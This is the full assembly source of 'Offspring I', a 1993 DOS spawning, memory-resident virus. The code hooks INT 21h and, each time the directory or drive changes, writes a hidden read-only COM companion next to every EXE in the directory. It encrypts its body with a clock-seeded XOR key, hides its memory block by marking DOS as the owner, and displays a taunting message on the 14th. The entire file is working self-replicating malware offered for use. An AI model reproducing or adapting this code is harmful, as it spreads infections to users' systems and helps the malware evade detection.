;-------------------------------------------------------------------------
; OSPRING.COM  - Make sure you compile this to a COM file
;  - Compatible with A86 v3.22
;  OFFSPRING I - By VG Enterprises (Virogen)
;
;      NOTICE : Don't hold me responsible for any damages, or the release
;               of this virus. Use this at your own risk. NOT intended
;               for any lamers to upload the Mcafee! Thank you for your            
;               loyal obendience.
;
;  TYPE : SPAWNING RESIDENT
;  VERSION : BETA 0.05
;
; FIXED/NEW IN VERSION 0.05
;                  - Mutation engine much smaller
;                  - Now change interrupt vectors directly
;                  - The XOR number is now generated randomly
;                    using the system clock as a base.
;                  - The FF/FN buffer has been moved outside
;                    of the virus code, so disk space is
;                    lowered.
;
;  INFECTION METHOD :  Everytime DOS changes directories, or changes 
;                      drives... all files in the CURRENT directory
;                      (the one you're coming out of) will be infected.
;                      COM files will be hidden, and have the read-only
;                      attribute. When they are executed they will
;                      check if the virus is already in memory, and
;                      then execute the corresponding EXE file. See
;                      DOCS.
;
;        This virus is NOT completed, so don't go off when you find a
;        bug. There is one that I haven't determined the cause of yet,
;        Do a 'DIR' of a directory other than the current, and see
;        what happens.  There's still some variables that can be 
;        moved outside of the code, but it won't make a hell of 
;        a difference in size.
;        
;
;
;
	title   off_spring_1
	.286
cseg    segment
	assume  cs: cseg, ss: cseg, es: cseg

signal  equ     7dh             ; Installation check
reply   equ     0FCh            ; Yep, we're here

cr      equ     0dh             ; carraige return
lf      equ     0ah             ; line feed

f_name  equ     1eh             ; Offset of file name in FF/FN buffer
f_sizel equ     1ch             ; File size - low

	org     100h            ; Leave room for PSP
; jump to the beginning of the main procedure
start:

	jmp     no_dec          ; Skip decryption, changes to NOP
	lea     di,enc_data+2   ; Point to byte after encryption num
	mov     dx,[di-2]       ; load encryption num
	call    encrypt         ; Decrypt the virus
	no_dec:
	jmp     main            ; Jump to main routine

enc_data DW     0000            ; Encryption Data - num we XOR by


ID      DB      cr,lf,'(c)1993 VG Enterprises',cr,lf ; my copyright
VNAME   Db      cr,lf,'* Congratulations, You have recieved the privelge of being infected by the *'
	Db      cr,lf,'* Offspring I v0.05. *','$'

fname   db      '*.EXE',0       ; Filespec to search for

sl      db      '\'             ; Backslash for directory name
file_dir db     64 dup(0)       ; directory of file we infected
file_name db    13 dup(0)       ; filename of file we infected
old_dta dd      0               ; old seg:off of DTA
old21_ofs dw    0               ; Offset of old INT 21H
old21_seg dw    0               ; Seg of old INT 21h

par_blk dw      0               ; command line count byte   -psp
par_cmd dw      0080h           ; Point to the command line -psp
par_seg dw      0               ; seg
	dw      05ch            ; Use default FCB's in psp to save space
par1    dw      0               ;        
	dw      06ch            ; FCB #2
par2    dw      0               ; 

;--------------------------------------------------------------------
; This is our new INT 21H (dos) interrupt handler!
;
;
;---------------------------------------------------------------------

new21   proc                    ; New INT 21H handler

	cmp     ah, signal      ; signaling us?
	jne     no
	mov     ah,reply        ; yep, give our offspring what he wants
	jmp     end_21
	no:
	cmp     ah, 3bh         ;
	je      run_res         ; Nope, jump
	cmp     ah,0eh
	jne     end_21

	run_res:
	push    ax
	push    bx
	push    cx
	push    dx
	push    di
	push    si
	push    bp
	push    ds
	push    es
	push    sp
	push    ss

	push    cs
	pop     ds
	mov     ah,2fh
	int     21h             ; Get the DTA

	mov     ax,es
	mov     word ptr cs: old_dta,bx
	mov     word ptr cs: old_dta+2,ax
	push    cs
	pop     es

	call    resident

	mov     dx,word ptr cs: old_dta
	mov     ax,word ptr cs: old_dta+2
	mov     ds,ax
	mov     ah,1ah
	int     21h             ; Restore the DTA

	pop     ss
	pop     sp
	pop     es
	pop     ds
	pop     bp
	pop     si
	pop     di
	pop     dx
	pop     cx
	pop     bx
	pop     ax
	end_21  :
	jmp     [ dword ptr cs: old21_ofs] ; jump to original int 21h
	iret
	new21   endp            ; End of handler


; ------------------------------------------------------------
;  Main procedure
; -----------------------------------------------------------
main    proc


	mov     word ptr [0100h],9090h ; NOP the jump past decryption
	mov     byte ptr [0102h],90h
	mov     bx,(offset vend+50) ; Calculate memory needed
	mov     cl,4            ; divide by 16
	shr     bx,cl
	inc     bx
	mov     ah,4ah
	int     21h             ; Release un-needed memory

	mov     ax,ds: 002ch    ; Get environment address
	mov     par_blk,ax      ; Save in parameter block for exec

	mov     par1,cs         ; Save segments for EXEC 
	mov     par2,cs
	mov     par_seg,cs

	mov     ah,2ah          ; Get date
	int     21h

	cmp     dl,14           ; 14th?
	jne     no_display

	mov     ah,09           ; Display message
	lea     dx,ID
	int     21h

	no_display:
	call    install         ; check if installed, if not install


	mov     dx,offset file_dir -1 ; Execute the original EXE
	mov     bx,offset par_blk ; For some damned reason
	mov     ax,4b00h        ; control is not returned back
	int     21h             ; to the virus.

	push    cs
	pop     ds
	mov     es,ds

	mov     ah,4ch          ; Exit
	int     21h
main    endp

;---------------
; INSTALL - Install the virus
;---------------

Install Proc

	mov     ah,signal
	int     21h
	cmp     ah,reply
	je      no_install


	xor     ax,ax
	mov     es,ax
	mov     ax,es: [21h*4+2]
	mov     bx,es: [21h*4]
	mov     ds: old21_seg,ax ; Store segment
	mov     ds: old21_ofs,bx ; Store offset

	cli

	mov     es: [21h*4+2],cs ; Save seg
	mov     es: [21h*4],offset new21 ; off

	sti

	push    cs
	pop     ds
	mov     es,ds

	mov     dx,(offset vend+50)
	add     dx,dx
				; Calculate memory needed
	mov     cl,4            ; \ Divide by 16
	shr     dx,cl           ; /
	add     dx,1            ; 

	mov     ax,3100h        ;
	int     21H             ; Terminate Stay Resident
	ret

	no_install:
	ret
Install Endp

;------------------------
; Resident - This is called from the INT 21h handler
;-----------------------------
resident proc

	mov     ax,ds           ; Calculate segment of MCB
	dec     ax              ;
	mov     ds,ax           ;
	mov     ds: [0001],word 0008h ; Mark DOS as the owner- so some
				; utilities won't id the file the virus 
				; loaded from.
	push    cs
	pop     ds


	mov     word ptr vend,0 ; Clear ff/fn buffer
	lea     si, vend        ;
	lea     di, vend+2      ;
	mov     cx,22           ;
	cld                     ;
	rep     movsw           ;

				; Set DTA address - This is for the Findfirst/Findnext INT 21H functions
	mov     ah, 1ah
	lea     dx, vend
	int     21h




; Find first .EXE file
	mov     ah, 4eh
	mov     cx, 0           ; Set normal file attribute search
	lea     dx, fname
	int     21h

	jnc     next_loop
	jmp     end_prog

	next_loop :

	mov     file_dir,0
	lea     si,file_dir
	lea     di,file_dir+1
	mov     cx,77
	cld
	rep     movsb

	mov     ah,47h
	xor     dl,dl
	lea     si,file_dir
	int     21h

	cmp     word ptr vend[f_sizel],0
	jne     find_file

	xor     bx,bx
	lm3     :
	inc     bx
	cmp     file_dir[bx],0
	jne     lm3

	mov     file_dir[bx],'\'
	inc     bx

	mov     cx,13
	lea     si,vend[f_name]
	lea     di,file_dir[bx]
	cld
	rep     movsb

	xor     bx,bx
	mov     bx,1eh

	loop_me:
	inc     bx
	cmp     byte ptr vend[bx], '.'
	jne     loop_me

	inc     bx
	mov     word ptr vend [bx],'OC'
	mov     byte ptr vend [bx+2],'M'


	call    write_file      ; Write virus to file
; Find next file
	find_file :

	mov     ah,4fh
	int     21h
	jnc     next_loop

	end_prog:
	exit    :
	ret
resident endp

;------------------------------------------------
; Write file procedure - Creates the file, writes the file, closes the file
;-----------------------------------------------
write_file proc


	lea     dx, vend[f_name]
	mov     ah, 3ch         ; Create file
	mov     cx, 02h         ; READ-ONLY
	or      cx, 01h         ; Hidden
	int     21h             ; Call INT 21H
	jc      no_infect       ; If Error-probably already infected

	mov     bx,ax
	push    dx


	call    copy_mem        ; copy virus just outside of code
	mov     ah,2ch          ;
	int     21h             ; Get random number from clock
	lea     di,vend+enc_data-204 ; offset of new copy of virus

	mov     [di-2],dx       ; save encryption #

	push    bx
	call    encrypt         ; writing it to a file
	pop     bx

	mov     cx, offset vend-100h ; # of bytes to write
	lea     dx, vend+50     ; Offset of buffer
	mov     ah, 40h         ; -- our program in memory
	int     21h             ; Call INT 21H function 40h

	pop     dx

	mov     ah, 3eh
	int     21h
	no_infect:
	ret                     ; Return
write_file endp

;------------------------------------------------
; Copies virus outside of code, to encrypt
;------------------------------------------------
copy_mem proc


	mov     si,0100h        ; si=0
	lea     di,vend+50      ; destination 
	mov     cx,offset vend-100h ; bytes to move
	cld
	rep     movsb

	ret
copy_mem endp


end_encrypt dw  0000h           ; Let's encrypt everything up to here

;------------------------------------------------
; Encrypt
;
; Call with 
;           di=offset of encrypted/decrypted data
;           dx=XOR value
;
; - First word to encrypt must be a free word.
;   This word will be used as the encryption base. Every time the virus
;   is encrypted a random number will be saved here. 
;   
;-----------------------------------------------

encrypt proc

	mov     cx,(offset end_encrypt - offset enc_data)/2
	E2:
	xor     [di],dx         ; Xor each word by dx
	inc     di
	inc     di              ; increment index
	loop    E2              ; loop while cx != 0

	ret

	encrypt endp



vend    dw      0

cseg    ends
	end     start
